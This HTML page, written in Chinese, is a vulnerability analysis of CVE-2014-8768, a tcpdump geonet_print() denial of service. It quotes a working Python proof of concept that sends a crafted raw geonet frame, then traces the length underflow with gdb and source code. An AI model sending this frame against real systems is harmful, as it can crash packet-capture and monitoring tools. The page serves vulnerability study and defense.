<!DOCTYPE html>
<html>
<head>
<title>CVE-2014-8768 Tcpdump 4.6.2 Geonet Denial Of Service Vulnerability</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
<style type="text/css">
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
.pl-c {
    color: #969896;
}

.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
    color: #0086b3;
}

.pl-e,.pl-en {
    color: #795da3;
}

.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
    color: #333;
}

.pl-ent {
    color: #63a35c;
}

.pl-k,.pl-s,.pl-st {
    color: #a71d5d;
}

.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
    color: #df5000;
}

.pl-id {
    color: #b52a1d;
}

.pl-ii {
    background-color: #b52a1d;
    color: #f8f8f8;
}

.pl-sr .pl-cce {
    color: #63a35c;
    font-weight: bold;
}

.pl-ml {
    color: #693a17;
}

.pl-mh,.pl-mh .pl-en,.pl-ms {
    color: #1d3e81;
    font-weight: bold;
}

.pl-mq {
    color: #008080;
}

.pl-mi {
    color: #333;
    font-style: italic;
}

.pl-mb {
    color: #333;
    font-weight: bold;
}

.pl-md,.pl-mdhf {
    background-color: #ffecec;
    color: #bd2c00;
}

.pl-mdht,.pl-mi1 {
    background-color: #eaffea;
    color: #55a532;
}

.pl-mdr {
    color: #795da3;
    font-weight: bold;
}

.pl-mo {
    color: #1d3e81;
}
.task-list {
padding-left:10px;
margin-bottom:0;
}

.task-list li {
    margin-left: 20px;
}

.task-list-item {
list-style-type:none;
padding-left:10px;
}

.task-list-item label {
font-weight:400;
}

.task-list-item.enabled label {
cursor:pointer;
}

.task-list-item+.task-list-item {
margin-top:3px;
}

.task-list-item-checkbox {
display:inline-block;
margin-left:-20px;
margin-right:3px;
vertical-align:1px;
}
</style>
</head>
<body>
<h1 id="cve-2014-8768-tcpdump-4-6-2-geonet-denial-of-service-vulnerability">CVE-2014-8768 Tcpdump 4.6.2 Geonet Denial Of Service Vulnerability</h1>
<p><strong>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</strong></p>
<ul>
<li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8768">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8768</a></li></ul>
<p>作者给出的应该是fuzzing的代码，写上一篇分析的时候我以为是作者手动构造的，后来想了想，如果是手动构造应该更偏向无限大（长度字段），而不是<code>\x02\x02\x02\x02</code></p>
<ul>
<li><a href="http://www.expku.com/dos/4386.html">http://www.expku.com/dos/4386.html</a></li></ul>
<p>所以省略些不必要的，来看关键的，在<code>geonet_print()</code>函数中存在漏洞，我们分析过前一篇文章中的漏洞之后，其实这里可以猜测就是读取了不可读的内存导致的拒绝服务</p>
<pre><code>3. Technical Description
The application decoder for the geonet protocol fails to perform 
external input validation and performs insufficient checking on length 
computations leading to an unsafe decrement and underflow in the function

geonet_print(netdissect_options *ndo, const u_char *eth, const u_char 
*bp, u_int length)

The affected variable is length which is later on used to print a memory 
chunk which eventually leads to a segfault. The function contains 
several unsafe computations updating the length variable.

To reproduce start tcpdump on a network interface

sudo tcpdump -i lo -s 0 -n -v

(running the program with sudo might hide the segfault message on 
certain environments, see dmesg for details)

and use the following python program to generate a frame on the network 
(might also need sudo):

#!/usr/bin/env python
from socket import socket, AF_PACKET, SOCK_RAW
s = socket(AF_PACKET, SOCK_RAW)
s.bind((&quot;lo&quot;, 0))

geonet_frame = 
&quot;\x00\x1f\xc6\x51\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\xc6\x51\x07\x07\x07\x07\x07\x07\xef\x06\x07\x35\x97\x00\x24\x8c\x7a\xdf\x6f\x08\x00\x45\x00\x00\x3d\xf3\x7f\x40\x00\x40\x11\x30\xc6\x0a\x01\x01\x68\x0a\x01\x01\x01\x99\x80\x00\x35\x00\x29\x16\xa5\x01\x76\x01\x00\x00\xff\x00\x00\x01\x00\x00\x00&quot;

s.send(geonet_frame)

4. Affected versions
Affected versions are 4.5.0 through 4.6.2

(segfaults were reproducible in versions up to 4.6.1 on Ubuntu 14.04, 
but not reliably in 4.6.2. Code audit showed that unsafe computations 
are performed in 4.6.2, but the trigger frame might need to look different).

5. Fix
The problem is fixed in the upcoming version tcpdump 4.7.0
</code></pre><p>我们使用<code>4.5.1</code>版本，下载编译参考</p>
<ul>
<li><a href="http://couplee.wang/Linux/TCPDump%204.5.1%20Denial%20Of%20Service%20Vulnerability/article.html">TCPDump 4.5.1 Denial Of Service Vulnerability</a></li></ul>
<p>先测试Poc的有效性，gdb调试模式启动tcpdump</p>
<pre><code>wnagzihxain@toT0C:~$ sudo gdb tcpdump
</code></pre><p>设置参数</p>
<pre><code>gdb-peda$ set args -i ens33 -s 0 -n -v
</code></pre><p>跑起来，运行Poc，发现持续的数据输出，可以确定是读取指针指向内存的时候没有判断边界的问题，最后读到了不可读的内存</p>
<p><img src="Image/1.png" alt=""></p>
<p>回溯函数调用栈，可以看到如作者所说，是由<code>geonet_print()</code>开始触发的，最后是在<code>hex_and_ascii_print_with_offset()</code>进行读取操作造成直接崩溃，但是漏洞成因还是在前面那个函数里</p>
<pre><code>gdb-peda$ bt
#0  0x080547ee in hex_and_ascii_print_with_offset ()
#1  0x08054a2e in hex_and_ascii_print ()
#2  0x080c2e1a in ndo_default_print ()
#3  0x080c2e3a in default_print ()
#4  0x0806f7d1 in geonet_print ()
#5  0x0806ae5b in ethertype_print ()
#6  0x0806a8b2 in ether_print ()
#7  0x0806a951 in ether_if_print ()
#8  0x080c2c7f in print_packet ()
#9  0x080ef63e in pcap_handle_packet_mmap (handle=handle@entry=0x8235058, callback=callback@entry=0x80c2c13 &lt;print_packet&gt;, user=user@entry=0xbfffe46c &quot; :#\b+\251\006\b\001&quot;, frame=0xb7a36420 &quot;\250&quot;, tp_len=0x4b, tp_mac=0x56, 
    tp_snaplen=0x4b, tp_sec=0x5a4d9f9a, tp_usec=0xb4723, tp_vlan_tci_valid=0x0, tp_vlan_tci=0x0) at ./pcap-linux.c:4264
#10 0x080f3884 in pcap_read_linux_mmap_v3 (handle=0x8235058, max_packets=0xffffffff, callback=0x80c2c13 &lt;print_packet&gt;, user=0xbfffe46c &quot; :#\b+\251\006\b\001&quot;) at ./pcap-linux.c:4429
#11 0x080d9da9 in pcap_loop (p=0x8235058, cnt=&lt;optimized out&gt;, callback=0x80c2c13 &lt;print_packet&gt;, user=0xbfffe46c &quot; :#\b+\251\006\b\001&quot;) at ./pcap.c:856
#12 0x080c2229 in main ()
#13 0xb7c34637 in __libc_start_main (main=0x80c083a &lt;main&gt;, argc=0x7, argv=0xbffff654, init=0x80f7300 &lt;__libc_csu_init&gt;, fini=0x80f7360 &lt;__libc_csu_fini&gt;, rtld_fini=0xb7fea8a0 &lt;_dl_fini&gt;, stack_end=0xbffff64c)
    at ../csu/libc-start.c:291
#14 0x0804a3d3 in _start ()
</code></pre><p>所以我们查看其源码，发现传入的有四个参数，需要调试过程中确定</p>
<pre><code>void
geonet_print(netdissect_options *ndo, const u_char *eth, const u_char *bp, u_int length)
</code></pre><p>确定传入的参数，可以确定第一个参数是传入的数据首地址指针，第二个同样指向数据帧，第三个跳过了前两字节，指向数据帧，第四个是整个数据帧长度</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0xb7a16086 --&gt; 0x51c61f00 
EBX: 0x8164000 --&gt; 0x8163ef0 --&gt; 0x1 
ECX: 0x4b (&#39;K&#39;)
EDX: 0x4b (&#39;K&#39;)
ESI: 0x8235058 --&gt; 0x80f3790 (&lt;pcap_read_linux_mmap_v3&gt;:    push   ebp)
EDI: 0x0 
EBP: 0xbfffe1f8 --&gt; 0xbfffe258 --&gt; 0xbfffe288 --&gt; 0xbfffe2b8 --&gt; 0x4b (&#39;K&#39;)
ESP: 0xbfffe1cc --&gt; 0x806ae5b (&lt;ethertype_print+1072&gt;:    add    esp,0x10)
EIP: 0x806f47d (&lt;geonet_print&gt;:    push   ebp)
EFLAGS: 0x200292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x806f47a &lt;print_long_pos_vector+184&gt;:    nop
   0x806f47b &lt;print_long_pos_vector+185&gt;:    leave  
   0x806f47c &lt;print_long_pos_vector+186&gt;:    ret    
=&gt; 0x806f47d &lt;geonet_print&gt;:    push   ebp
   0x806f47e &lt;geonet_print+1&gt;:    mov    ebp,esp
   0x806f480 &lt;geonet_print+3&gt;:    sub    esp,0x38
   0x806f483 &lt;geonet_print+6&gt;:    mov    eax,DWORD PTR [ebp+0xc]
   0x806f486 &lt;geonet_print+9&gt;:    add    eax,0x6
[------------------------------------stack-------------------------------------]
0000| 0xbfffe1cc --&gt; 0x806ae5b (&lt;ethertype_print+1072&gt;:    add    esp,0x10)
0004| 0xbfffe1d0 --&gt; 0x8233a20 --&gt; 0x0 
0008| 0xbfffe1d4 --&gt; 0xb7a16086 --&gt; 0x51c61f00 
0012| 0xbfffe1d8 --&gt; 0xb7a16094 --&gt; 0x70751c6 
0016| 0xbfffe1dc --&gt; 0x3d (&#39;=&#39;)
0020| 0xbfffe1e0 --&gt; 0x1 
0024| 0xbfffe1e4 --&gt; 0x1 
0028| 0xbfffe1e8 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 5, 0x0806f47d in geonet_print ()
gdb-peda$ x/16x $eax
0xb7a16086:    0x51c61f00    0x07070707    0x07070707    0x51c60707
0xb7a16096:    0x07070707    0x06ef0707    0x00973507    0xdf7a8c24
0xb7a160a6:    0x4500086f    0xf33d0000    0x4000407f    0x0ac63011
0xb7a160b6:    0x0a680101    0x99010101    0x00350080    0x01a51629
</code></pre><p>然后我们使用IDA来分析，打断点的指令就是存在漏洞的地方，可以看到就是循环开始，在分析了后面的指令后，发现该指令只进行了指针的自加一，没有判断边界的问题，这是直接的拒绝服务触发原因</p>
<p><img src="Image/2.png" alt=""></p>
<p>然后我们来找造成这个拒绝服务的地方</p>
<p>我们看到取值进行自加一的指针是传入的第二个参数，那么根据参数进行回溯，看看这个参数是哪个地方传进来的</p>
<pre><code>void hex_and_ascii_print_with_offset(register const char *ident, register const u_char *cp, register u_int length, register u_int oset)

void hex_and_ascii_print(register const char *ident, register const u_char *cp, register u_int length)

static void ndo_default_print(netdissect_options *ndo _U_, const u_char *bp, u_int length)

default_print(bp, length);
</code></pre><p>在经过了几次的回溯之后，我们发现传入的<code>bp</code>指针对应着最后函数的<code>cp</code>参数，接下来我们在<code>geonet_print()</code>中分析<code>default_print(bp, length)</code>的两个参数是如何计算的</p>
<p>首先是判断数据帧的长度，因为在调试的时候发现传入的长度是<code>0x3d</code>，所以这里满足条件</p>
<pre><code>if (length &gt;= 36)
</code></pre><p>解析数据</p>
<pre><code>/* Process Common Header */
int version = bp[0] &gt;&gt; 4;
int next_hdr = bp[0] &amp; 0x0f;
int hdr_type = bp[1] &gt;&gt; 4;
int hdr_subtype = bp[1] &amp; 0x0f;
u_int16_t payload_length = EXTRACT_16BITS(bp+4);
int hop_limit = bp[7];
const char *next_hdr_txt = &quot;Unknown&quot;;
const char *hdr_type_txt = &quot;Unknown&quot;;
int hdr_size = -1;
</code></pre><p>通过调试，对应如下</p>
<pre><code>int version = 0x0c
int next_hdr = 0x06
int hdr_type = 0x05
hdr_subtype = 0x01
u_int16_t payload_length = 0x0707
int hop_limit = 0x07
const char *next_hdr_txt = &quot;Unknown&quot;;
const char *hdr_type_txt = &quot;Unknown&quot;;
int hdr_size = -1;
</code></pre><p>然后后面的各种分支就可以分析了</p>
<p>两个<code>switch</code>不重要，减去头部长度，然后指针指向下一个待分析的数据</p>
<pre><code>length -= 36;
bp += 36;
</code></pre><p><code>hdr_type</code>字段之前解析出是<code>0x05</code></p>
<pre><code>/* Process Extended Headers */
switch (hdr_type) {
    case 0: /* Any */
        hdr_size = 0;
        break;
    case 1: /* Beacon */
        hdr_size = 0;
        break;
    case 2: /* GeoUnicast */
        break;
    case 3: switch (hdr_subtype) {
            case 0: /* GeoAnycastCircle */
                break;
            case 1: /* GeoAnycastRect */
                break;
            case 2: /* GeoAnycastElipse */
                break;
        }
        break;
    case 4: switch (hdr_subtype) {
            case 0: /* GeoBroadcastCircle */
                break;
            case 1: /* GeoBroadcastRect */
                break;
            case 2: /* GeoBroadcastElipse */
                break;
        }
        break;
    case 5: switch (hdr_subtype) {
            case 0: /* TopoScopeBcast-SH */
                hdr_size = 0;
                break;
            case 1: /* TopoScopeBcast-MH */
                hdr_size = 68 - 36;
                break;
        }
        break;
    case 6: switch (hdr_subtype) {
            case 0: /* LocService-Request */
                break;
            case 1: /* LocService-Reply */
                break;
        }
        break;
}
</code></pre><p>因为<code>hdr_type</code>是<code>0x05</code>，所以进入第二个<code>switch</code>，第二个<code>hdr_subtype</code>是<code>0x01</code>，所以<code>hdr_size</code>是<code>32</code></p>
<pre><code>case 5: switch (hdr_subtype) {
    case 0: /* TopoScopeBcast-SH */
        hdr_size = 0;
        break;
    case 1: /* TopoScopeBcast-MH */
        hdr_size = 68 - 36;
        break;
}
break;
</code></pre><p>前面计算出<code>hdr_size</code>是<code>32</code>，这里会进入，但只是给两个字段做一下处理，并没有进入<code>switch</code></p>
<pre><code>/* Skip Extended headers */
if (hdr_size &gt;= 0) {
    length -= hdr_size;
    bp += hdr_size;
    switch (next_hdr) {
        case 0: /* Any */
            break;
        case 1:
        case 2: /* BTP A/B */
            print_btp(bp);
            length -= 4;
            bp += 4;
            print_btp_body(bp, length);
            break;
        case 3: /* IPv6 */
            break;
    }
}
</code></pre><p>但是问题就在这里，当程序跳过了<code>0x20</code>字节的头部数据后，只剩<code>0x19</code>字节</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0x20 (&#39; &#39;)
EBX: 0x8164000 --&gt; 0x8163ef0 --&gt; 0x1 
ECX: 0x7ffffff1 
EDX: 0xb7dcf870 --&gt; 0x0 
ESI: 0x8235058 --&gt; 0x80f3790 (&lt;pcap_read_linux_mmap_v3&gt;:    push   ebp)
EDI: 0x0 
EBP: 0xbfffe1c8 --&gt; 0xbfffe1f8 --&gt; 0xbfffe258 --&gt; 0xbfffe288 --&gt; 0xbfffe2b8 --&gt; 0x4b (&#39;K&#39;)
ESP: 0xbfffe190 --&gt; 0x8164224 --&gt; 0xb7c656a0 (&lt;__snprintf&gt;:    push   ebx)
EIP: 0x806f761 (&lt;geonet_print+740&gt;:    sub    DWORD PTR [ebp+0x14],eax)
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x806f758 &lt;geonet_print+731&gt;:    cmp    DWORD PTR [ebp-0x20],0x0
   0x806f75c &lt;geonet_print+735&gt;:    js     0x806f7b9 &lt;geonet_print+828&gt;
   0x806f75e &lt;geonet_print+737&gt;:    mov    eax,DWORD PTR [ebp-0x20]
=&gt; 0x806f761 &lt;geonet_print+740&gt;:    sub    DWORD PTR [ebp+0x14],eax
   0x806f764 &lt;geonet_print+743&gt;:    mov    eax,DWORD PTR [ebp-0x20]
   0x806f767 &lt;geonet_print+746&gt;:    add    DWORD PTR [ebp+0x10],eax
   0x806f76a &lt;geonet_print+749&gt;:    mov    eax,DWORD PTR [ebp-0x18]
   0x806f76d &lt;geonet_print+752&gt;:    cmp    eax,0x2
[------------------------------------stack-------------------------------------]
0000| 0xbfffe190 --&gt; 0x8164224 --&gt; 0xb7c656a0 (&lt;__snprintf&gt;:    push   ebx)
0004| 0xbfffe194 --&gt; 0xb7fe98c2 (&lt;_dl_fixup+194&gt;:    mov    edi,eax)
0008| 0xbfffe198 --&gt; 0xb7fffad0 --&gt; 0xb7fffa74 --&gt; 0xb7ffd308 --&gt; 0xb7fff918 --&gt; 0x0 
0012| 0xbfffe19c --&gt; 0x707d340 
0016| 0xbfffe1a0 --&gt; 0x8106c82 (&quot;Unknown&quot;)
0020| 0xbfffe1a4 --&gt; 0x8106d2b (&quot;TopoScopeBcast-MH&quot;)
0024| 0xbfffe1a8 --&gt; 0x20 (&#39; &#39;)
0028| 0xbfffe1ac --&gt; 0xc (&#39;\x0c&#39;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0806f761 in geonet_print ()
gdb-peda$ x/x $ebp+0x14
0xbfffe1dc:    0x00000019
</code></pre><p>再次减去<code>0x20</code>字节，成为负值</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0x20 (&#39; &#39;)
EBX: 0x8164000 --&gt; 0x8163ef0 --&gt; 0x1 
ECX: 0x7ffffff1 
EDX: 0xb7dcf870 --&gt; 0x0 
ESI: 0x8235058 --&gt; 0x80f3790 (&lt;pcap_read_linux_mmap_v3&gt;:    push   ebp)
EDI: 0x0 
EBP: 0xbfffe1c8 --&gt; 0xbfffe1f8 --&gt; 0xbfffe258 --&gt; 0xbfffe288 --&gt; 0xbfffe2b8 --&gt; 0x4b (&#39;K&#39;)
ESP: 0xbfffe190 --&gt; 0x8164224 --&gt; 0xb7c656a0 (&lt;__snprintf&gt;:    push   ebx)
EIP: 0x806f764 (&lt;geonet_print+743&gt;:    mov    eax,DWORD PTR [ebp-0x20])
EFLAGS: 0x200287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x806f75c &lt;geonet_print+735&gt;:    js     0x806f7b9 &lt;geonet_print+828&gt;
   0x806f75e &lt;geonet_print+737&gt;:    mov    eax,DWORD PTR [ebp-0x20]
   0x806f761 &lt;geonet_print+740&gt;:    sub    DWORD PTR [ebp+0x14],eax
=&gt; 0x806f764 &lt;geonet_print+743&gt;:    mov    eax,DWORD PTR [ebp-0x20]
   0x806f767 &lt;geonet_print+746&gt;:    add    DWORD PTR [ebp+0x10],eax
   0x806f76a &lt;geonet_print+749&gt;:    mov    eax,DWORD PTR [ebp-0x18]
   0x806f76d &lt;geonet_print+752&gt;:    cmp    eax,0x2
   0x806f770 &lt;geonet_print+755&gt;:    jg     0x806f77b &lt;geonet_print+766&gt;
[------------------------------------stack-------------------------------------]
0000| 0xbfffe190 --&gt; 0x8164224 --&gt; 0xb7c656a0 (&lt;__snprintf&gt;:    push   ebx)
0004| 0xbfffe194 --&gt; 0xb7fe98c2 (&lt;_dl_fixup+194&gt;:    mov    edi,eax)
0008| 0xbfffe198 --&gt; 0xb7fffad0 --&gt; 0xb7fffa74 --&gt; 0xb7ffd308 --&gt; 0xb7fff918 --&gt; 0x0 
0012| 0xbfffe19c --&gt; 0x707d340 
0016| 0xbfffe1a0 --&gt; 0x8106c82 (&quot;Unknown&quot;)
0020| 0xbfffe1a4 --&gt; 0x8106d2b (&quot;TopoScopeBcast-MH&quot;)
0024| 0xbfffe1a8 --&gt; 0x20 (&#39; &#39;)
0028| 0xbfffe1ac --&gt; 0xc (&#39;\x0c&#39;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0806f764 in geonet_print ()
gdb-peda$ x/x $ebp+0x14
0xbfffe1dc:    0xfffffff9
</code></pre><p>最后到达调用的地方</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x8164000 --&gt; 0x8163ef0 --&gt; 0x1 
ECX: 0x7ffffff1 
EDX: 0xb7dcf870 --&gt; 0x0 
ESI: 0x8235058 --&gt; 0x80f3790 (&lt;pcap_read_linux_mmap_v3&gt;:    push   ebp)
EDI: 0x0 
EBP: 0xbfffe1c8 --&gt; 0xbfffe1f8 --&gt; 0xbfffe258 --&gt; 0xbfffe288 --&gt; 0xbfffe2b8 --&gt; 0x4b (&#39;K&#39;)
ESP: 0xbfffe180 --&gt; 0xb7a160d8 --&gt; 0x0 
EIP: 0x806f7cc (&lt;geonet_print+847&gt;:    call   0x80c2e20 &lt;default_print&gt;)
EFLAGS: 0x200296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x806f7c3 &lt;geonet_print+838&gt;:    sub    esp,0x8
   0x806f7c6 &lt;geonet_print+841&gt;:    push   DWORD PTR [ebp+0x14]
   0x806f7c9 &lt;geonet_print+844&gt;:    push   DWORD PTR [ebp+0x10]
=&gt; 0x806f7cc &lt;geonet_print+847&gt;:    call   0x80c2e20 &lt;default_print&gt;
   0x806f7d1 &lt;geonet_print+852&gt;:    add    esp,0x10
   0x806f7d4 &lt;geonet_print+855&gt;:    nop
   0x806f7d5 &lt;geonet_print+856&gt;:    leave  
   0x806f7d6 &lt;geonet_print+857&gt;:    ret
Guessed arguments:
arg[0]: 0xb7a160d8 --&gt; 0x0 
arg[1]: 0xfffffff9 
[------------------------------------stack-------------------------------------]
0000| 0xbfffe180 --&gt; 0xb7a160d8 --&gt; 0x0 
0004| 0xbfffe184 --&gt; 0xfffffff9 
0008| 0xbfffe188 --&gt; 0x1 
0012| 0xbfffe18c --&gt; 0x8106d2b (&quot;TopoScopeBcast-MH&quot;)
0016| 0xbfffe190 --&gt; 0x8164224 --&gt; 0xb7c656a0 (&lt;__snprintf&gt;:    push   ebx)
